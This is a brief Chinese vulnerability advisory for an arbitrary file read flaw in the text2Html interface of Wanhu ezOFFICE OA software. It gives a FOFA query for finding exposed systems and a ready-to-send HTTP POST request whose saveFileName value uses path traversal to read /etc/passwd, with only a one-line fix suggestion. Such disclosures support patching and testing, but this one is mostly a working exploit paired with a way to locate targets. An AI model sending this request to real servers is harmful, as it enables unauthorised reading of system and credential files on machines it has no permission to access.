**漏洞描述**

万户OA text2Html 接口存在文件读取漏洞，攻击者可以通过恶意构造的请求读取服务器上的任意文件，包括敏感的系统文件。此漏洞可能导致泄露敏感信息，为攻击者提供足够的信息来进一步渗透系统。

**漏洞环境**

FOFA：app="万户网络-ezOFFICE"

**漏洞复现**

```yaml
POST /defaultroot/convertFile/text2Html.controller HTTP/1.1

saveFileName=../../../etc/passwd&moduleName=html
```



**漏洞修复建议**

 请关注官方网站及时更新http://www.whir.net